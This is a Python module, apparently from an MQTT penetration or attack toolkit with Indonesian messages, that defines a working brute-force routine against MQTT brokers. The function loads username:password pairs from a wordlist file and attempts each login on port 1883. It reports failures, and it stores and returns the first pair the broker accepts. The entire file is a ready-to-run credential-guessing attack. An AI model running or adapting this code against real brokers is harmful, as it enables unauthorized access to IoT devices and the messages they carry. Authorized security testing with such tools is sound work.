from core.global_state import brute_force_credentials
from colorama import Fore, Style
import time
import paho.mqtt.client as mqtt
import os

def mqtt_brute_force_combined(broker_ip):
    print(f"\n{Fore.YELLOW}[*] Melakukan brute force dengan wordlist.txt di {broker_ip}...{Style.RESET_ALL}")
    
    # Akses file wordlist dari folder 'assets'
    base_dir = os.path.dirname(os.path.dirname(__file__))  
    wordlist_path = os.path.join(base_dir, "assets", "wordlist.txt")

    if not os.path.exists(wordlist_path):
        print(f"[!] File wordlist tidak ditemukan di {wordlist_path}")
        return

    with open(wordlist_path, encoding='utf-8', errors='ignore') as f:
        credentials = [line.strip().split(":") for line in f if ":" in line]

    for username, password in credentials:
        success = {"ok": False}

        def on_connect(client, userdata, flags, rc):
            success["ok"] = (rc == 0)

        client = mqtt.Client()
        client.username_pw_set(username, password)
        client.on_connect = on_connect

        try:
            client.connect(broker_ip, 1883, 5)
            client.loop_start()
            time.sleep(2)
            client.loop_stop()
            client.disconnect()

            if success["ok"]:
                print(f"{Fore.GREEN}[+] Ditemukan kredensial valid: {username}:{password}{Style.RESET_ALL}")
                
                # Update global credentials
                brute_force_credentials["username"] = username
                brute_force_credentials["password"] = password

                # Kembalikan tuple juga jika mau dipakai lokal
                return (username, password)
            else:
                print(f"{Fore.RED}[-] Kredensial salah: {username}:{password}{Style.RESET_ALL}")

        except Exception as e:
            print(f"{Fore.RED}[-] Gagal login {username}:{password} - {e}{Style.RESET_ALL}")

    print(f"{Fore.RED}[!] Tidak ada kredensial yang valid ditemukan.{Style.RESET_ALL}")
    return None
